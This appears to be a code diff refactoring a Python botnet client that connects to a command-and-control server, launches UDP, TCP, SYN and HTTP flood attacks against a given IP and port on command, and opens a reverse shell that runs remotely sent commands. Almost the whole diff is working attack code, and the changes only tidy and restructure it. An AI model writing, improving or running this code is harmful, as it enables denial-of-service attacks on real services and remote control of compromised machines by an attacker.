@@ -1,18 +1,18 @@
 #!/usr/bin/env python3
 
 # import libraries
-from signal import signal, SIGINT
-import os
-import threading
-import socket
 import multiprocessing
-import sys
+import os
 import random
+import socket
 import subprocess
+import sys
 import time
+from threading import Thread
+from signal import SIGINT, signal
 
 # get platform
-if sys.platform in ('linux', 'linux2'):
+if sys.platform in ("linux", "linux2"):
     planet_os = "linux"
 elif sys.platform == "darwin":
     planet_os = "mac"
@@ -23,13 +23,10 @@ else:
     print("This platform is unsupported.")
     os._exit(0)
 
-# functions
-def wait_for_threads():
-    while open_threads > 0:
-        time.sleep(0.1)
 
-def ddos_udp():
-    global open_threads, requests_sent
+# functions
+def ddos_udp(target_ip, target_port):
+    global requests_sent
     while planet_attacking:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -39,10 +36,10 @@ def ddos_udp():
             requests_sent += 1
         except IOError:
             time.sleep(10)
-    open_threads -= 1
 
-def ddos_tcp():
-    global open_threads, requests_sent
+
+def ddos_tcp(target_ip, target_port):
+    global requests_sent
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while planet_attacking:
         try:
@@ -50,14 +47,14 @@ def ddos_tcp():
             s.setblocking(0)
             s.sendto(random._urandom(10240), (str(target_ip), int(target_port)))
             requests_sent += 1
-        except IOError as e:
+        except IOError:
             time.sleep(10)
     if "s" in locals():
         s.close()
-    open_threads -= 1
 
-def ddos_syn():
-    global open_threads, requests_sent
+
+def ddos_syn(target_ip, target_port):
+    global requests_sent
     while planet_attacking:
         try:
             s = socket.socket()
@@ -68,24 +65,30 @@ def ddos_syn():
             time.sleep(10)
     if "s" in locals():
         s.close()
-    open_threads -= 1
 
-def ddos_http():
-    global open_threads, requests_sent
-    src_ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
+
+def ddos_http(target_ip, target_port):
+    global requests_sent
+    src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
     while planet_attacking:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(target_ip), int(target_port)))
-            s.sendto((f"GET /{target_ip} HTTP/1.1\r\n").encode('ascii'), (str(target_ip), int(target_port)))
-            s.sendto((f"Host: {src_ip} \r\n\r\n").encode('ascii'), (str(target_ip), int(target_port)))
+            s.sendto(
+                (f"GET /{target_ip} HTTP/1.1\r\n").encode("ascii"),
+                (str(target_ip), int(target_port)),
+            )
+            s.sendto(
+                (f"Host: {src_ip} \r\n\r\n").encode("ascii"),
+                (str(target_ip), int(target_port)),
+            )
             s.close()
             requests_sent += 1
         except IOError:
             time.sleep(10)
-    open_threads -= 1
 
-def exit_handler(sig, frame):
+
+def exit_handler(*args):
     global planet_online, planet_shutting_down, planet_attacking, planet_shelled
     planet_shutting_down = True
     if planet_online:
@@ -95,8 +98,8 @@ def exit_handler(sig, frame):
     planet_shelled = False
     planet_socket.close()
     print("Exiting...")
-    wait_for_threads()
     os._exit(0)
+
 
 def connect_to_galaxy():
     global planet_socket, planet_online
@@ -111,7 +114,8 @@ def connect_to_galaxy():
             print("Cannot connect to galaxy. Retrying in 5 seconds...")
             time.sleep(5)
 
-def shell():
+
+def shell(shell_buf_size):
     global planet_shelled
     shell_socket = socket.socket()
     shell_socket.connect((galaxy_ip, shell_port))
@@ -121,12 +125,10 @@ def shell():
         shell_cmds = []
         shell_cmd = shell_socket.recv(shell_buf_size).decode()
         if shell_cmd.lower() == "exit":
-            shell_socket.close()
-            planet_shelled = False
             break
-        if "&&" in shell_cmd and not ";" in shell_cmd:
+        if "&&" in shell_cmd and ";" not in shell_cmd:
             shell_cmds = shell_cmd.split("&&")
-        elif ";" in shell_cmd and not "&&" in shell_cmd:
+        elif ";" in shell_cmd and "&&" not in shell_cmd:
             shell_cmds = shell_cmd.split(";")
         elif "&&" in shell_cmd and ";" in shell_cmd:
             shell_cmds = shell_cmd.split("&&")
@@ -161,10 +163,12 @@ def shell():
         shell_socket.send(message.encode())
     if planet_shutting_down:
         shell_socket.send("shutting down".encode())
+    planet_shelled = False
     shell_socket.close()
 
+
 def connection_handler():
-    global planet_online, flood_type, target_ip, target_port, open_threads, planet_id, planet_shelled, planet_attacking, shell_buf_size
+    global planet_online, planet_id, planet_shelled, planet_attacking
     while not planet_shutting_down:
         while planet_online:
             try:
@@ -183,38 +187,35 @@ def connection_handler():
                     if planet_os == "windows":
                         system_limits = int(ctypes.windll.msvcrt._getmaxstdio())
                     else:
-                        system_limits = int(os.popen("ulimit -n").read().strip())
+                        system_limits = int(os.popen("/usr/bin/ulimit -n").read().strip())
                     if attack_thread_count >= system_limits:
                         attack_thread_count = system_limits - 128
                     planet_attacking = True
-                    threading.Thread(target=ddos_check_reqs).start()
+                    Thread(target=ddos_check_reqs).start()
                     if flood_type == "udp":
                         for _ in range(attack_thread_count):
-                            threading.Thread(target=ddos_udp).start()
-                            open_threads += 1
+                            Thread(target=ddos_udp, args=(target_ip, target_port)).start()
                     elif flood_type == "http":
                         for _ in range(attack_thread_count):
-                            threading.Thread(target=ddos_http).start()
-                            open_threads += 1
+                            Thread(target=ddos_http, args=(target_ip, target_port)).start()
                     elif flood_type == "syn":
                         for _ in range(attack_thread_count):
-                            threading.Thread(target=ddos_syn).start()
-                            open_threads += 1
+                            Thread(target=ddos_syn, args=(target_ip, target_port)).start()
                     else:
                         for _ in range(attack_thread_count):
-                            threading.Thread(target=ddos_tcp).start()
-                            open_threads += 1
+                            Thread(target=ddos_tcp, args=(target_ip, target_port)).start()
                     planet_socket.send(f"planet ID: {planet_id} attacking".encode())
-                    print(f"Attacking! (IP: {target_ip} | Port: {target_port} | Type: {flood_type} flood)")
+                    print(
+                        f"Attacking! (IP: {target_ip} | Port: {target_port} | Type: {flood_type})"
+                    )
                 elif "planet ID: " in data:
                     planet_id = data.replace("planet ID: ", "").strip()
                     print(f"Recieved planet ID: {planet_id}")
                     print(data)
                 elif "shellcmd start bufsize " in data:
-                    shell_buf_size = int(data.replace("shellcmd start bufsize ", "").strip())
                     planet_shelled = True
                     planet_socket.send(f"planet ID: {planet_id} shelled".encode())
-                    shell()
+                    shell(int(data.replace("shellcmd start bufsize ", "").strip()))
             except Exception:
                 print("Having trouble connecting to galaxy, attempting to reconnect...")
                 planet_online = False
@@ -225,6 +226,7 @@ def connection_handler():
         planet_attacking = False
         planet_shelled = False
 
+
 def ddos_check_reqs():
     while planet_attacking:
         old_requests_sent = requests_sent
@@ -232,6 +234,7 @@ def ddos_check_reqs():
         requests_sent_5_sec = requests_sent - old_requests_sent
         requests_sent_1_sec = requests_sent_5_sec / 5
         print(f"Requests Per Second: {requests_sent_1_sec}")
+
 
 # exit handler
 signal(SIGINT, exit_handler)
@@ -241,12 +244,7 @@ galaxy_ip = "192.168.1.2"
 galaxy_port = 9999
 shell_port = 10000
 planet_threads = multiprocessing.cpu_count()
-open_threads = 0
 planet_id = ""
-flood_type = ""
-target_ip = ""
-target_port = 0
-shell_buf_size = 1024 * 128
 planet_shelled = False
 planet_attacking = False
 planet_online = False
@@ -257,5 +255,4 @@ requests_sent = 0
 
 # connect to galaxy
 connect_to_galaxy()
-connection_handler_thread = threading.Thread(target=connection_handler)
-connection_handler_thread.start()
+Thread(target=connection_handler).start()
